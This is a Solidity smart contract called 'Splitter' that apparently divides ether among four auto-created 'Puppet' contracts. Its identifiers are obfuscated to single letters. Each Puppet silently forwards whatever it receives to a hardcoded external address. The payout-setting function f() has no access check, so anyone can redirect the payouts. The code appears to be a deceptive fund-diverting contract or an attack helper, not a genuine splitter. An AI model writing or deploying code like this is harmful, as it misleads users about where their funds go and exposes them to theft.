pragma solidity ^0.4.23;

contract Splitter{

	address public m;
	address[] public h;
	mapping (uint256 => address) public o;
	address private n;
	uint256 private k;
	uint256 private l;


	constructor() payable public{
		m = msg.sender;
		d();
		d();
		d();
		d();
		o[0] = h[0];
        o[1] = h[1];
        o[2] = h[2];
        o[3] = h[3];
	}


	function g() public{
		require(msg.sender == m);
		m.transfer(address(this).balance);
	}


	function a() public constant returns(uint256 c){
    	return h.length;
  	}


	function d() public returns(address d){
	    require(msg.sender == m);
    	Puppet p = new Puppet();
    	h.push(p);
    	return p;
  		}


    function f(uint256 r, address e) public {
        require(e != address(0));
        o[r] = e;
    }


    function b() public payable {
        require(msg.sender == m);
    	k = SafeMath.t(msg.value, 4);
        o[0].call.value(k).gas(800000)();
        o[1].call.value(k).gas(800000)();
        o[2].call.value(k).gas(800000)();
        o[3].call.value(k).gas(800000)();
        }


function() payable public{
	}
}

contract Puppet {

    mapping (uint256 => address) public j;
    mapping (uint256 => address) public i;

	constructor() payable public{

		j[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
        i[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
	}


	function() public payable{
	    if(msg.sender != j[0]){
			j[0].call.value(msg.value).gas(600000)();
		}
    }


	function g() public{
		require(msg.sender == i[0]);
		i[0].transfer(address(this).balance);
	}
}


library SafeMath {

  function p(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function t(uint256 a, uint256 b) internal pure returns (uint256) {
    return a / b;
  }

  function s(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function q(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}